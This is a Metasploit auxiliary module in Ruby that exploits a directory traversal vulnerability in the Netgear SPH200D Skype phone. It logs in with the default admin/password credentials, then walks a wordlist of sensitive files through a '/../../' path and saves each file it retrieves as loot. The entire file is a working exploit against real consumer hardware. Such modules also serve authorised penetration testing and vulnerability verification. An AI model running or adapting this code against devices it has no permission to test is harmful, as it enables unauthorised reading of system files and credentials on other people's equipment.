##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Netgear SPH200D Directory Traversal Vulnerability',
			'Description' => %q{
					This module exploits a directory traversal vulnerablity which is present in
				Netgear SPH200D Skype telephone.
			},
			'References'  =>
				[
					[ 'BID', '57660' ],
					[ 'EDB', '24441' ],
					[ 'URL', 'http://support.netgear.com/product/SPH200D' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-002' ]
				],
			'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
			'License'     => MSF_LICENSE
		)
		register_options(
			[
				OptPath.new('FILELIST',  [ true, "File containing sensitive files, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "sensitive_files.txt") ]),
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'password'])
			], self.class)
	end

	def extract_words(wordfile)
		return [] unless wordfile && File.readable?(wordfile)
		begin
			words = File.open(wordfile, "rb") do |f|
				f.read
			end
		rescue
			return []
		end
		save_array = words.split(/\r?\n/)
		return save_array
	end

	#traversal every file
	def find_files(file,user,pass)
		traversal = '/../../'

		res = send_request_cgi({
			'method'     => 'GET',
			'uri'        => normalize_uri(traversal, file),
			'authorization' => basic_auth(user,pass)
		})

		if res and res.code == 200 and res.body !~ /404\ File\ Not\ Found/
			print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
			report_web_vuln({
				:host     => rhost,
				:port     => rport,
				:vhost    => datastore['VHOST'],
				:path     => "/",
				:pname    => normalize_uri(traversal, file),
				:risk     => 3,
				:proof    => normalize_uri(traversal, file),
				:name     => self.fullname,
				:category => "web",
				:method   => "GET"
			})

			loot = store_loot("lfi.data","text/plain",rhost, res.body,file)
			vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
		elsif res and res.code
			vprint_error("#{rhost}:#{rport} - Attempt returned HTTP error #{res.code} when trying to access #{file}")
		end
	end

	def run_host(ip)
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']

		vprint_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

		#test login
		begin
			res = send_request_cgi({
				'uri'        => '/',
				'method'     => 'GET',
				'authorization' => basic_auth(user,pass)
			})

			return :abort if res.nil?
			return :abort if (res.headers['Server'].nil? or res.headers['Server'] !~ /simple httpd/)
			return :abort if (res.code == 404)

			if [200, 301, 302].include?(res.code)
				vprint_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
			else
				vprint_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
				return :abort
			end

		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return :abort
		end

		extract_words(datastore['FILELIST']).each do |file|
			find_files(file,user,pass) unless file.empty?
		end
	end
end
